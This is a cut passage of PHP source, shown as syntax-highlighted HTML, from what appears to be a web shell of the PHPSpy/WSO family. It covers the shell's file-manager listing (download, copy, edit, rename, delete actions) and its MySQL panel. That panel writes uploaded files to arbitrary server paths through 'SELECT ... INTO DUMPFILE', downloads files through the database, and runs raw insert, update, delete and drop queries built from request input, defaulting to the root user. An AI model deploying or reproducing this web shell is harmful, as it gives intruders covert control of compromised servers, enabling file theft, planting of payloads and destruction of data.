</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;a href=&#34;javascript:fileperm(\&#39;&#39; . $dirdb[&#39;server_link&#39;] . &#39;\&#39;);&#34;&gt;&#39; . $dirdb[&#39;dirperm&#39;] . &#39;&lt;/a&gt;&#39; . $dirdb[&#39;fileowner&#39;] . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td nowrap&gt;&lt;a href=&#34;javascript:rename(\&#39;&#39; . $dirdb[&#39;server_link&#39;] . &#39;\&#39;);&#34;&gt;Rename&lt;/a&gt;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $dir_i++;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                if ($dirdb[&#39;filename&#39;] == &#39;..&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;tr class=&#39; . bg() . &#39;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td align=&#34;center&#34;&gt;-&lt;/td&gt;&lt;td nowrap colspan=&#34;5&#34;&gt;&lt;a href=&#34;javascript:godir(\&#39;&#39; . getUpPath($nowpath) . &#39;\&#39;);&#34;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;tr bgcolor=&#34;#dddddd&#34; stlye=&#34;border-top:1px solid #fff;border-bottom:1px solid #ddd;&#34;&gt;&lt;td colspan=&#34;6&#34; height=&#34;5&#34;&gt;&lt;/td&gt;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $file_i = &#39;0&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        foreach ($filedata as $key =&gt; $filedb) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            if ($filedb[&#39;filename&#39;] != &#39;..&#39; &amp;&amp; $filedb[&#39;filename&#39;] != &#39;.&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $fileurl = str_replace($_SERVER[&#34;DOCUMENT_ROOT&#34;], &#39;&#39;, $filedb[&#39;server_link&#39;]);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $thisbg = bg();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;tr class=&#34;&#39; . $thisbg . &#39;&#34; onmouseover=&#34;this.className=\&#39;focus\&#39;;&#34; onmouseout=&#34;this.className=\&#39;&#39; . $thisbg . &#39;\&#39;;&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td width=&#34;2%&#34; nowrap&gt;&lt;input name=&#34;dl[]&#34; type=&#34;checkbox&#34; value=&#34;&#39; . $filedb[&#39;server_link&#39;] . &#39;&#34;&gt;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;&#39; . ((strpos($filedb[&#39;server_link&#39;], $_SERVER[&#34;DOCUMENT_ROOT&#34;]) !== false) ? &#39;&lt;a href=&#34;&#39; . $fileurl . &#39;&#34; target=&#34;_blank&#34;&gt;&#39; . $filedb[&#39;filename&#39;] . &#39;&lt;/a&gt;&#39; : $filedb[&#39;filename&#39;]) . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td nowrap&gt;&lt;a href=&#34;javascript:opfile(\&#39;newtime\&#39;,\&#39;&#39; . $filedb[&#39;server_link&#39;] . &#39;\&#39;,\&#39;&#39; . $filedb[&#39;dirlink&#39;] . &#39;\&#39;);&#34;&gt;&#39; . $filedb[&#39;mtime&#39;] . &#39;&lt;/a&gt;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td nowrap&gt;&#39; . $filedb[&#39;size&#39;] . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td nowrap&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;a href=&#34;javascript:fileperm(\&#39;&#39; . $filedb[&#39;server_link&#39;] . &#39;\&#39;);&#34;&gt;&#39; . $filedb[&#39;filechmod&#39;] . &#39;&lt;/a&gt; / &#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;a href=&#34;javascript:fileperm(\&#39;&#39; . $filedb[&#39;server_link&#39;] . &#39;\&#39;);&#34;&gt;&#39; . $filedb[&#39;fileperm&#39;] . &#39;&lt;/a&gt;&#39; . $filedb[&#39;fileowner&#39;] . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td nowrap&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;a href=&#34;javascript:dofile(\&#39;downfile\&#39;,\&#39;&#39; . $filedb[&#39;server_link&#39;] . &#39;\&#39;);&#34;&gt;Down&lt;/a&gt; | &#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;a href=&#34;javascript:copyfile(\&#39;&#39; . $filedb[&#39;server_link&#39;] . &#39;\&#39;);&#34;&gt;Copy&lt;/a&gt; | &#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;a href=&#34;javascript:opfile(\&#39;editfile\&#39;,\&#39;&#39; . $filedb[&#39;server_link&#39;] . &#39;\&#39;,\&#39;&#39; . $filedb[&#39;dirlink&#39;] . &#39;\&#39;);&#34;&gt;Edit&lt;/a&gt; | &#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;a href=&#34;javascript:rename(\&#39;&#39; . $filedb[&#39;server_link&#39;] . &#39;\&#39;);&#34;&gt;Rename&lt;/a&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;/td&gt;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $file_i++;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;tr class=&#34;head&#34;&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width=&#34;16%&#34;&gt;Last modified&lt;/td&gt;&lt;td width=&#34;10%&#34;&gt;Size&lt;/td&gt;&lt;td width=&#34;20%&#34;&gt;Chmod / Perms&lt;/td&gt;&lt;td width=&#34;22%&#34;&gt;Action&lt;/td&gt;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;tr class=&#34;&#39; . bg() . &#39;&#34;&gt;&lt;td align=&#34;center&#34;&gt;&lt;input name=&#34;chkall&#34; value=&#34;on&#34; type=&#34;checkbox&#34; onclick=&#34;CheckAll(this.form)&#34; /&gt;&lt;/td&gt;&lt;td colspan=&#34;4&#34;&gt;&lt;a href=&#34;javascript:dofile(\&#39;delfiles\&#39;);&#34;&gt;Delete selected&lt;/a&gt;&lt;/td&gt;&lt;td align=&#34;right&#34;&gt;&#39; . $dir_i . &#39; directories / &#39; . $file_i . &#39; files&lt;/td&gt;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;/form&gt;&lt;/table&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                } // end dir
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                elseif ($action == &#39;sqlfile&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if ($doing == &#34;mysqlupload&#34;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $file = $_FILES[&#39;uploadfile&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $filename = $file[&#39;tmp_name&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if (file_exists($savepath)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(&#39;The goal file has already existed&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            if (!$filename) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                m(&#39;Please choose a file&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $fp = @fopen($filename, &#39;r&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $contents = @fread($fp, filesize($filename));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                @fclose($fp);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $contents = bin2hex($contents);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                if (!$upname)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $upname = $file[&#39;name&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $result = q(&#34;SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE &#39;$savepath&#39;;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                m($result ? &#39;Upload success&#39; : &#39;Upload has failed: &#39; . mysql_error());
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &lt;script type=&#34;text/javascript&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            function mysqlfile(doing) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                if (!doing) return;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $(&#39;doing&#39;).value = doing;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $(&#39;mysqlfile&#39;).dbhost.value = $(&#39;dbinfo&#39;).dbhost.value;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $(&#39;mysqlfile&#39;).dbport.value = $(&#39;dbinfo&#39;).dbport.value;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $(&#39;mysqlfile&#39;).dbuser.value = $(&#39;dbinfo&#39;).dbuser.value;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $(&#39;mysqlfile&#39;).dbpass.value = $(&#39;dbinfo&#39;).dbpass.value;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $(&#39;mysqlfile&#39;).dbname.value = $(&#39;dbinfo&#39;).dbname.value;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $(&#39;mysqlfile&#39;).charset.value = $(&#39;dbinfo&#39;).charset.value;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $(&#39;mysqlfile&#39;).submit();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        !$dbhost &amp;&amp; $dbhost = &#39;localhost&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        !$dbuser &amp;&amp; $dbuser = &#39;root&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        !$dbport &amp;&amp; $dbport = &#39;3306&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        formhead(array(&#39;title&#39; =&gt; &#39;MYSQL Information&#39;, &#39;name&#39; =&gt; &#39;dbinfo&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;action&#39;, &#39;sqlfile&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;DBHost:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makeinput(array(&#39;name&#39; =&gt; &#39;dbhost&#39;, &#39;size&#39; =&gt; 20, &#39;value&#39; =&gt; $dbhost));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makeinput(array(&#39;name&#39; =&gt; &#39;dbport&#39;, &#39;size&#39; =&gt; 4, &#39;value&#39; =&gt; $dbport));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;DBUser:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makeinput(array(&#39;name&#39; =&gt; &#39;dbuser&#39;, &#39;size&#39; =&gt; 15, &#39;value&#39; =&gt; $dbuser));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;DBPass:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makeinput(array(&#39;name&#39; =&gt; &#39;dbpass&#39;, &#39;size&#39; =&gt; 15, &#39;value&#39; =&gt; $dbpass));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;DBName:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makeinput(array(&#39;name&#39; =&gt; &#39;dbname&#39;, &#39;size&#39; =&gt; 15, &#39;value&#39; =&gt; $dbname));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;DBCharset:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makeselect(array(&#39;name&#39; =&gt; &#39;charset&#39;, &#39;option&#39; =&gt; $charsetdb, &#39;selected&#39; =&gt; $charset, &#39;nokey&#39; =&gt; 1));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;form action=&#34;&#39; . $self . &#39;&#34; method=&#34;POST&#34; enctype=&#34;multipart/form-data&#34; name=&#34;mysqlfile&#34; id=&#34;mysqlfile&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;h2&gt;Upload file&lt;/h2&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;p&gt;&lt;b&gt;This operation the DB user must has FILE privilege&lt;/b&gt;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;p&gt;Save path(fullpath): &lt;input class=&#34;input&#34; name=&#34;savepath&#34; size=&#34;45&#34; type=&#34;text&#34; /&gt; Choose a file: &lt;input class=&#34;input&#34; name=&#34;uploadfile&#34; type=&#34;file&#34; /&gt; &lt;a href=&#34;javascript:mysqlfile(\&#39;mysqlupload\&#39;);&#34;&gt;Upload&lt;/a&gt;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;h2&gt;Download file&lt;/h2&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;p&gt;File: &lt;input class=&#34;input&#34; name=&#34;mysqldlfile&#34; size=&#34;115&#34; type=&#34;text&#34; /&gt; &lt;a href=&#34;javascript:mysqlfile(\&#39;mysqldown\&#39;);&#34;&gt;Download&lt;/a&gt;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;dbhost&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;dbport&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;dbuser&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;dbpass&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;dbname&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;charset&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;doing&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;action&#39;, &#39;sqlfile&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;/form&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                } elseif ($action == &#39;mysqladmin&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    !$dbhost &amp;&amp; $dbhost = &#39;localhost&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    !$dbuser &amp;&amp; $dbuser = &#39;root&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    !$dbport &amp;&amp; $dbport = &#39;3306&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $dbform = &#39;&lt;input type=&#34;hidden&#34; id=&#34;connect&#34; name=&#34;connect&#34; value=&#34;1&#34; /&gt;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (isset($dbhost)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $dbform .= &#34;&lt;input type=\&#34;hidden\&#34; id=\&#34;dbhost\&#34; name=\&#34;dbhost\&#34; value=\&#34;$dbhost\&#34; /&gt;\n&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (isset($dbuser)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $dbform .= &#34;&lt;input type=\&#34;hidden\&#34; id=\&#34;dbuser\&#34; name=\&#34;dbuser\&#34; value=\&#34;$dbuser\&#34; /&gt;\n&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (isset($dbpass)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $dbform .= &#34;&lt;input type=\&#34;hidden\&#34; id=\&#34;dbpass\&#34; name=\&#34;dbpass\&#34; value=\&#34;$dbpass\&#34; /&gt;\n&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (isset($dbport)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $dbform .= &#34;&lt;input type=\&#34;hidden\&#34; id=\&#34;dbport\&#34; name=\&#34;dbport\&#34; value=\&#34;$dbport\&#34; /&gt;\n&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (isset($dbname)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $dbform .= &#34;&lt;input type=\&#34;hidden\&#34; id=\&#34;dbname\&#34; name=\&#34;dbname\&#34; value=\&#34;$dbname\&#34; /&gt;\n&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (isset($charset)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $dbform .= &#34;&lt;input type=\&#34;hidden\&#34; id=\&#34;charset\&#34; name=\&#34;charset\&#34; value=\&#34;$charset\&#34; /&gt;\n&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if ($doing == &#39;backupmysql&#39; &amp;&amp; $saveasfile) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if (!$table) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(&#39;Please choose the table&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $fp = @fopen($path, &#39;w&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            if ($fp) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                foreach ($table as $k =&gt; $v) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    if ($v) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        sqldumptable($v, $fp);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                fclose($fp);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $fileurl = str_replace(SA_ROOT, &#39;&#39;, $path);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                m(&#39;Database has success backup to &lt;a href=&#34;&#39; . $fileurl . &#39;&#34; target=&#34;_blank&#34;&gt;&#39; . $path . &#39;&lt;/a&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                mysql_close();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                m(&#39;Backup failed&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if ($insert &amp;&amp; $insertsql) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $keystr = $valstr = $tmp = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        foreach ($insertsql as $key =&gt; $val) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            if ($val) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $keystr .= $tmp . $key;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $valstr .= $tmp . &#34;&#39;&#34; . addslashes($val) . &#34;&#39;&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $tmp = &#39;,&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if ($keystr &amp;&amp; $valstr) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(q(&#34;INSERT INTO $tablename ($keystr) VALUES ($valstr)&#34;) ? &#39;Insert new record of success&#39; : mysql_error());
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if ($update &amp;&amp; $insertsql &amp;&amp; $base64) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $valstr = $tmp = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        foreach ($insertsql as $key =&gt; $val) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $valstr .= $tmp . $key . &#34;=&#39;&#34; . addslashes($val) . &#34;&#39;&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $tmp = &#39;,&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if ($valstr) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $where = base64_decode($base64);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(q(&#34;UPDATE $tablename SET $valstr WHERE $where LIMIT 1&#34;) ? &#39;Record updating&#39; : mysql_error());
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if ($doing == &#39;del&#39; &amp;&amp; $base64) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $where = base64_decode($base64);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $delete_sql = &#34;DELETE FROM $tablename WHERE $where&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        m(q(&#34;DELETE FROM $tablename WHERE $where&#34;) ? &#39;Deletion record of success&#39; : mysql_error());
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if ($tablename &amp;&amp; $doing == &#39;drop&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
